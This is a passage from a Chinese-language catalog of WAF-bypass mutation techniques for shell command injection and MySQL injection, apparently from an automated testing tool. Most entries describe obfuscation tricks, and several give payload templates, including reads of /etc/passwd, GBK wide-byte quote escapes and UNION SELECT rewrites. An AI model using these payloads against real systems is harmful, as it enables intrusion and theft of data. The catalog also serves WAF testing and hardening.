- **来源**：system
- **机制/族**：noise-dilution / noise-dilution
- **后端/版本门槛**：generic / -
- **原理**：-
- **模板**：-
- **来源备注**：添加不影响执行目标的非破坏性参数（cat -n, ls -la）
- **属性**：protected=yes；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-23T11:44:36.029513+00:00；updated=2026-08-24T01:07:51.952214+00:00；retired=-

### `part:argument-change` — 参数组织变换

- **状态**：seed
- **来源**：system
- **机制/族**：equivalent-substitution / function-swap
- **后端/版本门槛**：generic / -
- **原理**：-
- **模板**：-
- **来源备注**：改变命令参数的顺序、格式或路径组织方式（/etc/./passwd, /etc//passwd）
- **属性**：protected=yes；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-23T11:44:36.029513+00:00；updated=2026-08-24T01:07:51.952214+00:00；retired=-

### `part:bash-ism` — Bash特性利用

- **状态**：seed
- **来源**：system
- **机制/族**：parser-differential / parser-differential
- **后端/版本门槛**：generic / -
- **原理**：-
- **模板**：-
- **来源备注**：利用 bash 特有语法（ANSI-C引用 $'...', process substitution <(...), parameter expansion）
- **属性**：protected=yes；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-23T11:44:36.029513+00:00；updated=2026-08-24T01:07:51.952214+00:00；retired=-

### `part:brace-expand` — 花括号展开

- **状态**：seed
- **来源**：system
- **机制/族**：equivalent-substitution / function-swap
- **后端/版本门槛**：generic / -
- **原理**：-
- **模板**：-
- **来源备注**：使用 {a,b} 语法构造命令或参数（{cat,head}, {c,h}at, {/etc,/tmp}）
- **属性**：protected=yes；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-23T11:44:36.029513+00:00；updated=2026-08-24T01:07:51.952214+00:00；retired=-

### `part:combine-three` — 三技术组合

- **状态**：seed
- **来源**：system
- **机制/族**：- / composite
- **后端/版本门槛**：generic / -
- **原理**：-
- **模板**：-
- **来源备注**：组合三个不同家族的语义变异技术（深层组合绕过）
- **属性**：protected=yes；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-23T11:44:36.029513+00:00；updated=2026-08-24T01:07:51.952214+00:00；retired=-

### `part:combine-two` — 双技术组合

- **状态**：seed
- **来源**：system
- **机制/族**：- / composite
- **后端/版本门槛**：generic / -
- **原理**：-
- **模板**：-
- **来源备注**：组合两个不同家族的语义变异技术（如分隔符替换+变量间接引用）
- **属性**：protected=yes；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-23T11:44:36.029513+00:00；updated=2026-08-24T01:07:51.952214+00:00；retired=-

### `part:command-equivalent` — 命令等价替换

- **状态**：seed
- **来源**：system
- **机制/族**：equivalent-substitution / function-swap
- **后端/版本门槛**：generic / -
- **原理**：-
- **模板**：-
- **来源备注**：保持相同验证目标的命令等价表达（cat→head/tail/nl, whoami→id, ls→find .）
- **属性**：protected=yes；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-23T11:44:36.029513+00:00；updated=2026-08-24T01:07:51.952214+00:00；retired=-

### `part:control-add` — 添加控制流

- **状态**：seed
- **来源**：system
- **机制/族**：equivalent-substitution / operator-swap
- **后端/版本门槛**：generic / -
- **原理**：-
- **模板**：-
- **来源备注**：添加管道或条件执行结构（| head, && echo DONE）
- **属性**：protected=yes；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-23T11:44:36.029513+00:00；updated=2026-08-24T01:07:51.952214+00:00；retired=-

### `part:control-remove` — 移除控制流

- **状态**：seed
- **来源**：system
- **机制/族**：equivalent-substitution / operator-swap
- **后端/版本门槛**：generic / -
- **原理**：-
- **模板**：-
- **来源备注**：移除可选的管道或条件执行结构
- **属性**：protected=yes；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-23T11:44:36.029513+00:00；updated=2026-08-24T01:07:51.952214+00:00；retired=-

### `part:herestring-add` — 添加Here-string

- **状态**：seed
- **来源**：system
- **机制/族**：equivalent-substitution / operator-swap
- **后端/版本门槛**：generic / -
- **原理**：-
- **模板**：-
- **来源备注**：使用 <<< 或 < 重定向输入替代命令行参数
- **属性**：protected=yes；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-23T11:44:36.029513+00:00；updated=2026-08-24T01:07:51.952214+00:00；retired=-

### `part:herestring-remove` — 移除Here-string

- **状态**：seed
- **来源**：system
- **机制/族**：equivalent-substitution / operator-swap
- **后端/版本门槛**：generic / -
- **原理**：-
- **模板**：-
- **来源备注**：移除 Here-string / 输入重定向，恢复命令行参数形式
- **属性**：protected=yes；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-23T11:44:36.029513+00:00；updated=2026-08-24T01:07:51.952214+00:00；retired=-

### `part:ifs-change` — 空白分隔变换

- **状态**：seed
- **来源**：system
- **机制/族**：equivalent-substitution / whitespace-sub
- **后端/版本门槛**：generic / -
- **原理**：-
- **模板**：-
- **来源备注**：使用 IFS、空格、制表符等不同空白方式（${IFS}, $IFS, \t）
- **属性**：protected=yes；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-23T11:44:36.029513+00:00；updated=2026-08-24T01:07:51.952214+00:00；retired=-

### `part:loop-add` — 添加有限循环

- **状态**：seed
- **来源**：system
- **机制/族**：indirect-execution / indirect-exec
- **后端/版本门槛**：generic / -
- **原理**：-
- **模板**：-
- **来源备注**：添加有限次数、可终止的循环结构（for i in 1; do ...; done）
- **属性**：protected=yes；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-23T11:44:36.029513+00:00；updated=2026-08-24T01:07:51.952214+00:00；retired=-

### `part:loop-remove` — 移除循环

- **状态**：seed
- **来源**：system
- **机制/族**：indirect-execution / indirect-exec
- **后端/版本门槛**：generic / -
- **原理**：-
- **模板**：-
- **来源备注**：移除可选的有限循环结构
- **属性**：protected=yes；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-23T11:44:36.029513+00:00；updated=2026-08-24T01:07:51.952214+00:00；retired=-

### `part:path-change` — 路径解析变换

- **状态**：seed
- **来源**：system
- **机制/族**：equivalent-substitution / function-swap
- **后端/版本门槛**：generic / -
- **原理**：-
- **模板**：-
- **来源备注**：改变命令路径的引用方式（绝对路径→相对路径→PATH解析→which查找）
- **属性**：protected=yes；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-23T11:44:36.029513+00:00；updated=2026-08-24T01:07:51.952214+00:00；retired=-

### `part:separator-change` — 分隔符替换

- **状态**：seed
- **来源**：system
- **机制/族**：equivalent-substitution / operator-swap
- **后端/版本门槛**：generic / -
- **原理**：-
- **模板**：-
- **来源备注**：替换命令分隔符为等价结构（; → | → || → && → %0a → $(...) → ``）
- **属性**：protected=yes；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-23T11:44:36.029513+00:00；updated=2026-08-24T01:07:51.952214+00:00；retired=-

### `part:stderr-add` — 添加错误抑制

- **状态**：seed
- **来源**：system
- **机制/族**：noise-dilution / noise-dilution
- **后端/版本门槛**：generic / -
- **原理**：-
- **模板**：-
- **来源备注**：添加 2>/dev/null 或 2>&- 非破坏性错误处理
- **属性**：protected=yes；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-23T11:44:36.029513+00:00；updated=2026-08-24T01:07:51.952214+00:00；retired=-

### `part:stderr-remove` — 移除错误抑制

- **状态**：seed
- **来源**：system
- **机制/族**：noise-dilution / noise-dilution
- **后端/版本门槛**：generic / -
- **原理**：-
- **模板**：-
- **来源备注**：移除 2>/dev/null 等错误抑制（测试 WAF 是否依赖错误输出）
- **属性**：protected=yes；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-23T11:44:36.029513+00:00；updated=2026-08-24T01:07:51.952214+00:00；retired=-

### `part:subshell-add` — 添加子Shell

- **状态**：seed
- **来源**：system
- **机制/族**：indirect-execution / indirect-exec
- **后端/版本门槛**：generic / -
- **原理**：-
- **模板**：-
- **来源备注**：用 $(...) 或 `` 包装命令（$(cat /etc/passwd), `cat /etc/passwd`）
- **属性**：protected=yes；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-23T11:44:36.029513+00:00；updated=2026-08-24T01:07:51.952214+00:00；retired=-

### `part:subshell-remove` — 移除子Shell

- **状态**：seed
- **来源**：system
- **机制/族**：indirect-execution / indirect-exec
- **后端/版本门槛**：generic / -
- **原理**：-
- **模板**：-
- **来源备注**：移除子Shell包装，直接执行命令
- **属性**：protected=yes；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-23T11:44:36.029513+00:00；updated=2026-08-24T01:07:51.952214+00:00；retired=-

### `part:var-indirect` — 变量间接引用

- **状态**：seed
- **来源**：system
- **机制/族**：indirect-execution / indirect-exec
- **后端/版本门槛**：generic / -
- **原理**：-
- **模板**：-
- **来源备注**：通过变量间接构造命令名（c=cat;$c, x=ca;y=t;$x$y）
- **属性**：protected=yes；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-23T11:44:36.029513+00:00；updated=2026-08-24T01:07:51.952214+00:00；retired=-

### `part:wildcard` — 通配符路径

- **状态**：seed
- **来源**：system
- **机制/族**：equivalent-substitution / function-swap
- **后端/版本门槛**：generic / -
- **原理**：-
- **模板**：-
- **来源备注**：使用 ? * [] 匹配命令或文件路径（/etc/pass?d, /etc/[p]asswd, /bin/c?t）
- **属性**：protected=yes；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-23T11:44:36.029513+00:00；updated=2026-08-24T01:07:51.952214+00:00；retired=-

## SQL 注入（111 条）

### `part:case-mix` — 关键字大小写混合

- **状态**：seed
- **来源**：system
- **机制/族**：equivalent-substitution / case-mutation
- **后端/版本门槛**：generic / -
- **原理**：-
- **模板**：-
- **来源备注**：SELECT→SeLeCt→sElEcT, UNION→UnIoN, database→DaTaBaSe（须叠加另一维度）
- **属性**：protected=yes；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-23T11:44:36.029513+00:00；updated=2026-08-24T01:07:51.952214+00:00；retired=-

### `part:clause-restructure` — 子句结构重组

- **状态**：seed
- **来源**：system
- **机制/族**：parser-differential / parser-differential
- **后端/版本门槛**：generic / -
- **原理**：-
- **模板**：-
- **来源备注**：WHERE/ORDER BY/LIMIT 重排、条件重序、追加 FROM DUAL
- **属性**：protected=yes；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-23T11:44:36.029513+00:00；updated=2026-08-24T01:07:51.952214+00:00；retired=-

### `part:comment-change` — 注释终结符替换

- **状态**：seed
- **来源**：system
- **机制/族**：parser-differential / comment-injection
- **后端/版本门槛**：generic / -
- **原理**：-
- **模板**：-
- **来源备注**：替换 # / -- / ;%00 / /*...*/ 注释方式（URL 路径投递下禁用 #，优先 `-- -`, `/**/`, `;%00`）
- **属性**：protected=yes；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-23T11:44:36.029513+00:00；updated=2026-08-24T01:07:51.952214+00:00；retired=-

### `part:comment-inline` — 内联注释注入

- **状态**：seed
- **来源**：system
- **机制/族**：parser-differential / comment-injection
- **后端/版本门槛**：generic / -
- **原理**：-
- **模板**：-
- **来源备注**：在关键字之间插入 /*!*/ /**/ /*!50000*/ 内联注释扰乱 WAF 词法（SELE/**/CT, UNI/*!*/ON）
- **属性**：protected=yes；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-23T11:44:36.029513+00:00；updated=2026-08-24T01:07:51.952214+00:00；retired=-

### `part:fn-error-swap` — 报错函数替换

- **状态**：seed
- **来源**：system
- **机制/族**：equivalent-substitution / function-swap
- **后端/版本门槛**：generic / -
- **原理**：-
- **模板**：-
- **来源备注**：UpdateXML↔ExtractValue↔GTID_SUBSET↔EXP(~(SELECT...))↔FLOOR(RAND()*2) GROUP BY 报错
- **属性**：protected=yes；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-23T11:44:36.029513+00:00；updated=2026-08-24T01:07:51.952214+00:00；retired=-

### `part:fn-info-swap` — 信息函数同义替换

- **状态**：seed
- **来源**：system
- **机制/族**：equivalent-substitution / function-swap
- **后端/版本门槛**：generic / -
- **原理**：-
- **模板**：-
- **来源备注**：database()↔schema(), user()↔current_user(), version()↔@@version↔@@global.version, SUBSTRING↔MID↔SUBSTR
- **属性**：protected=yes；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-23T11:44:36.029513+00:00；updated=2026-08-24T01:07:51.952214+00:00；retired=-

### `part:fn-time-swap` — 延时函数替换

- **状态**：seed
- **来源**：system
- **机制/族**：equivalent-substitution / function-swap
- **后端/版本门槛**：generic / -
- **原理**：-
- **模板**：-
- **来源备注**：SLEEP(N) → BENCHMARK(N*1e6, MD5('a')) / GET_LOCK('x',N) / IF(1=1,SLEEP(N),0) / (SELECT SLEEP(N))
- **属性**：protected=yes；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-23T11:44:36.029513+00:00；updated=2026-08-24T01:07:51.952214+00:00；retired=-

### `part:fn-version-wrap` — 版本条件注释包裹

- **状态**：seed
- **来源**：system
- **机制/族**：parser-differential / comment-injection
- **后端/版本门槛**：generic / -
- **原理**：-
- **模板**：-
- **来源备注**：用 /*!50000...*/ 包裹关键字：SELECT→/*!50000SELECT*/, UNION→/*!UNION*/
- **属性**：protected=yes；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-23T11:44:36.029513+00:00；updated=2026-08-24T01:07:51.952214+00:00；retired=-

### `part:keyword-comment` — 关键字内插注释

- **状态**：seed
- **来源**：system
- **机制/族**：token-split / token-split
- **后端/版本门槛**：generic / -
- **原理**：-
- **模板**：-
- **来源备注**：UNION→UN/**/ION, SELECT→SEL/**/ECT, DATABASE→DATA/**/BASE
- **属性**：protected=yes；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-23T11:44:36.029513+00:00；updated=2026-08-24T01:07:51.952214+00:00；retired=-

### `part:operator-switch` — 逻辑运算符切换

- **状态**：seed
- **来源**：system
- **机制/族**：equivalent-substitution / operator-swap
- **后端/版本门槛**：generic / -
- **原理**：-
- **模板**：-
- **来源备注**：替换 OR/AND 为等价符号或位运算（OR→||→|, AND→&&→&, NOT→!, XOR→^）
- **属性**：protected=yes；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-23T11:44:36.029513+00:00；updated=2026-08-24T01:07:51.952214+00:00；retired=-

### `part:paren-restructure` — 括号重构

- **状态**：seed
- **来源**：system
- **机制/族**：parser-differential / parser-differential
- **后端/版本门槛**：generic / -
- **原理**：-
- **模板**：-
- **来源备注**：用括号消除空白依赖并改变解析结构（OR 1=1 → OR(1)=(1), UNION SELECT → UNION(SELECT ...)）
- **属性**：protected=yes；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-23T11:44:36.029513+00:00；updated=2026-08-24T01:07:51.952214+00:00；retired=-

### `part:predicate-bitwise` — 位运算谓词

- **状态**：seed
- **来源**：system
- **机制/族**：equivalent-substitution / operator-swap
- **后端/版本门槛**：generic / -
- **原理**：-
- **模板**：-
- **来源备注**：用位运算等价谓词（1&1=1, 1|0=1, 1^0=1, ~0<>0）替代常规比较
- **属性**：protected=yes；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-23T11:44:36.029513+00:00；updated=2026-08-24T01:07:51.952214+00:00；retired=-

### `part:predicate-cmp-func` — 字符串函数谓词

- **状态**：seed
- **来源**：system
- **机制/族**：equivalent-substitution / function-swap
- **后端/版本门槛**：generic / -
- **原理**：-
- **模板**：-
- **来源备注**：用 STRCMP/LOCATE/INSTR/FIND_IN_SET/LENGTH 等函数构造真值表达式
- **属性**：protected=yes；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-23T11:44:36.029513+00:00；updated=2026-08-24T01:07:51.952214+00:00；retired=-

### `part:predicate-regex` — 正则/LIKE 谓词

- **状态**：seed
- **来源**：system
- **机制/族**：equivalent-substitution / function-swap
- **后端/版本门槛**：generic / -
- **原理**：-
- **模板**：-
- **来源备注**：用 LIKE/REGEXP/RLIKE 等模式匹配替代等号比较（'a' LIKE 'a', 'a' REGEXP '^a'）
- **属性**：protected=yes；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-23T11:44:36.029513+00:00；updated=2026-08-24T01:07:51.952214+00:00；retired=-

### `part:predicate-rewrite` — 谓词表达式重写

- **状态**：seed
- **来源**：system
- **机制/族**：equivalent-substitution / function-swap
- **后端/版本门槛**：generic / -
- **原理**：-
- **模板**：-
- **来源备注**：等价改写布尔谓词（1=1→1 BETWEEN 0 AND 2→1 IN (1)→NOT(1<>1)→CASE WHEN 1=1 THEN 1 END→EXISTS(SELECT 1)）
- **属性**：protected=yes；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-23T11:44:36.029513+00:00；updated=2026-08-24T01:07:51.952214+00:00；retired=-

### `part:sql-combine` — SQL技术组合

- **状态**：seed
- **来源**：system
- **机制/族**：- / composite
- **后端/版本门槛**：generic / -
- **原理**：-
- **模板**：-
- **来源备注**：组合 2+ 种 SQL 语义变异技术（谓词重写+注释替换+空白替换 或 函数替换+HEX 值+版本注释）
- **属性**：protected=yes；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-23T11:44:36.029513+00:00；updated=2026-08-24T01:07:51.952214+00:00；retired=-

### `part:stacked-swap` — 堆叠语句等价替换

- **状态**：seed
- **来源**：system
- **机制/族**：equivalent-substitution / function-swap
- **后端/版本门槛**：generic / -
- **原理**：-
- **模板**：-
- **来源备注**：堆叠查询的第二条语句改写（; DROP → ; SELECT ... / ; CREATE ...）
- **属性**：protected=yes；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-23T11:44:36.029513+00:00；updated=2026-08-24T01:07:51.952214+00:00；retired=-

### `part:subquery-add` — 添加子查询

- **状态**：seed
- **来源**：system
- **机制/族**：equivalent-substitution / function-swap
- **后端/版本门槛**：generic / -
- **原理**：-
- **模板**：-
- **来源备注**：用子查询包装恒真谓词或比较值（1=1→1=(SELECT 1)，'admin'→(SELECT 'admin')）
- **属性**：protected=yes；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-23T11:44:36.029513+00:00；updated=2026-08-24T01:07:51.952214+00:00；retired=-

### `part:subquery-remove` — 移除子查询

- **状态**：seed
- **来源**：system
- **机制/族**：equivalent-substitution / function-swap
- **后端/版本门槛**：generic / -
- **原理**：-
- **模板**：-
- **来源备注**：移除子查询包装，恢复直接比较
- **属性**：protected=yes；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-23T11:44:36.029513+00:00；updated=2026-08-24T01:07:51.952214+00:00；retired=-

### `part:union-columns` — UNION 列值改写

- **状态**：seed
- **来源**：system
- **机制/族**：equivalent-substitution / function-swap
- **后端/版本门槛**：generic / -
- **原理**：-
- **模板**：-
- **来源备注**：UNION SELECT 的列值改为 NULL/0x.../CHAR(...)/子查询以避开列内容匹配
- **属性**：protected=yes；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-23T11:44:36.029513+00:00；updated=2026-08-24T01:07:51.952214+00:00；retired=-

### `part:union-rewrite` — UNION 结构重写

- **状态**：seed
- **来源**：system
- **机制/族**：token-split / token-split
- **后端/版本门槛**：generic / -
- **原理**：-
- **模板**：-
- **来源备注**：UNION SELECT → UNION ALL SELECT / UNION(SELECT ...) / UNION/**/SELECT / /*!50000UNION*//*!50000SELECT*/
- **属性**：protected=yes；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-23T11:44:36.029513+00:00；updated=2026-08-24T01:07:51.952214+00:00；retired=-

### `part:value-cast` — CAST/CONVERT 包装

- **状态**：seed
- **来源**：system
- **机制/族**：equivalent-substitution / function-swap
- **后端/版本门槛**：generic / -
- **原理**：-
- **模板**：-
- **来源备注**：用 CAST/CONVERT 包装值（'admin'→CAST(0x61646D696E AS CHAR)）
- **属性**：protected=yes；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-23T11:44:36.029513+00:00；updated=2026-08-24T01:07:51.952214+00:00；retired=-

### `part:value-char` — CHAR/CONCAT 构造值

- **状态**：seed
- **来源**：system
- **机制/族**：equivalent-substitution / function-swap
- **后端/版本门槛**：generic / -
- **原理**：-
- **模板**：-
- **来源备注**：用 CHAR(97,100,...) / CONCAT('a','d','m') / UNHEX() 构造字符串
- **属性**：protected=yes；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-23T11:44:36.029513+00:00；updated=2026-08-24T01:07:51.952214+00:00；retired=-

### `part:value-hex` — 十六进制字面量

- **状态**：seed
- **来源**：system
- **机制/族**：equivalent-substitution / function-swap
- **后端/版本门槛**：generic / -
- **原理**：-
- **模板**：-
- **来源备注**：字符串/数字改写为 0x... 十六进制字面量（'admin'→0x61646D696E, 1→0x1）
- **属性**：protected=yes；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-23T11:44:36.029513+00:00；updated=2026-08-24T01:07:51.952214+00:00；retired=-

### `part:value-scientific` — 科学计数/浮点值

- **状态**：seed
- **来源**：system
- **机制/族**：equivalent-substitution / function-swap
- **后端/版本门槛**：generic / -
- **原理**：-
- **模板**：-
- **来源备注**：数字改写为科学计数、浮点、位串（1→1e0→1.0→b'1'→true）
- **属性**：protected=yes；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-23T11:44:36.029513+00:00；updated=2026-08-24T01:07:51.952214+00:00；retired=-

### `part:ws-change` — 空白结构替换

- **状态**：seed
- **来源**：system
- **机制/族**：equivalent-substitution / whitespace-sub
- **后端/版本门槛**：generic / -
- **原理**：-
- **模板**：-
- **来源备注**：替换空白为等价形式（空格→/**/→+→%09→%0a→括号包围）
- **属性**：protected=yes；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-23T11:44:36.029513+00:00；updated=2026-08-24T01:07:51.952214+00:00；retired=-

### `sqli:ast:mysql_special_function_grammar` — MySQL 特殊语法函数文法覆盖不全绕过 AST

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：MySQL 存在非标准参数格式的系统函数与结构（substr(x from x for x)、group_concat(... order by ... SEPARATOR ...)、cast(... CHARACTER SET)、char(... using)、avg(distinctrow all)、INTO OUTFILE、procedure analyse、MATCH...AGAINST），语义引擎文法覆盖不全时语法解析报错放行。打 AST 方言文法覆盖盲区。
- **模板**：`select group_concat(distinct 1=1 order by 1 SEPARATOR 'asd')`、`select cast(flag AS char(10000) CHARACTER SET utf8)`、`select avg(distinctrow all (select 1,2)) from x`
- **来源备注**：`select group_concat(distinct 1=1 order by 1 SEPARATOR 'asd')`、`select cast(flag AS char(10000) CHARACTER SET utf8)`、`select avg(distinctrow all (select 1,2)) from x`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.265314+00:00；updated=2026-08-23T06:54:39.984437+00:00；retired=-

### `sqli:charset:binary_introducer` — 字符集引入符 _binary 前缀逃逸 token 识别

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：打字符集/token 分类盲区。MySQL 允许在字符串/十六进制/位字面量前加字符集引入符 `_binary`/`_utf8mb4`，且引入符与字面量间可带空格（`_binary 0x61646d696e`）。词法器若没建模该前缀 lexeme，会把它拆成未知 token+数字，降低"这是SQL"置信度；DB 端则正常解析并执行，产生与引擎预期的字面量类型不同的常量。
- **模板**：`?id=1 AND username=_binary 0x61646d696e--`、`?id=1' AND '1'=_utf8mb4'1'--`、`?id=1 AND 1=_binary 0x1--`
- **来源备注**：`?id=1 AND username=_binary 0x61646d696e--`、`?id=1' AND '1'=_utf8mb4'1'--`、`?id=1 AND 1=_binary 0x1--`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.265314+00:00；updated=2026-08-23T06:54:39.984437+00:00；retired=-

### `sqli:charset:collate_binary` — BINARY/collation 大小写敏感绕过

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：MySQL `BINARY` 关键字/collation `_bin` 让比较大小写敏感，`'a'=BINARY 'A'` 为假，可把"等于判定"改造成与 WAF 认知相反的形态；`COLLATE utf8mb4_bin` 指定排序规则，WAF 若按默认大小写不敏感建模会误判布尔语义。BINARY 关键字本身也是 WAF 词表常漏项。
- **模板**：`AND 'a'=BINARY 'A'`、`AND BINARY username='ADMIN'`、`AND username COLLATE utf8mb4_bin='admin'`
- **来源备注**：`AND 'a'=BINARY 'A'`、`AND BINARY username='ADMIN'`、`AND username COLLATE utf8mb4_bin='admin'`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.265314+00:00；updated=2026-08-23T06:54:39.984437+00:00；retired=-

### `sqli:charset:gbk_widebyte` — 宽字节 GBK %bf%27 绕过 addslashes/转义

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：GBK 等双字节字符集下 `%bf%27` 中 `%bf` 与 `'` 的 GBK 码构成一个合法汉字，后端 addslashes/magic_quotes 只转义 `'`（前加反斜杠）时，`%bf\'` 的 `%bf\` 被 GBK 解析为一个汉字、`'` 逃出转义成为裸引号。PATT/MySQL 5.0.22 发布说明实证。WAF 按 UTF-8 字节流检测不到这个字符集转换盲区。
- **模板**：`1%bf%27 UNION SELECT 1,2,3-- -`、`1%df%27 OR 1=1-- -`
- **来源备注**：`1%bf%27 UNION SELECT 1,2,3-- -`、`1%df%27 OR 1=1-- -`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.265314+00:00；updated=2026-08-23T06:54:39.984437+00:00；retired=-

### `sqli:charset:infoschema2innodb` — information_schema 换成 InnoDB 统计表枚举

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
- **原理**：sqlmap infoschema2innodb tamper 把 `information_schema.tables` 换成 `mysql.innodb_table_stats`（列名 table_name→database_name），绕 OWASP CRS 942140 等把 information_schema 当硬 token 的异常评分 WAF。系统表名完全不同、WAF 无特征。
- **模板**：`SELECT table_name FROM mysql.innodb_table_stats`、`SELECT DISTINCT database_name FROM mysql.innodb_table_stats`
- **来源备注**：`SELECT table_name FROM mysql.innodb_table_stats`、`SELECT DISTINCT database_name FROM mysql.innodb_table_stats`
- **属性**：protected=no；composable=no；priority=3；labels=-
- **统计**：success=0；bypass=0；attempt=0；distinct_primitive=0
- **时间**：created=2026-08-22T10:20:32.265314+00:00；updated=2026-08-23T06:54:39.984437+00:00；retired=-

### `sqli:charset:no_backslash_escapes` — NO_BACKSLASH_ESCAPES sql_mode 下反斜杠不转义

- **状态**：frontier
- **来源**：generated
- **机制/族**：- / -
- **后端/版本门槛**：generic / -
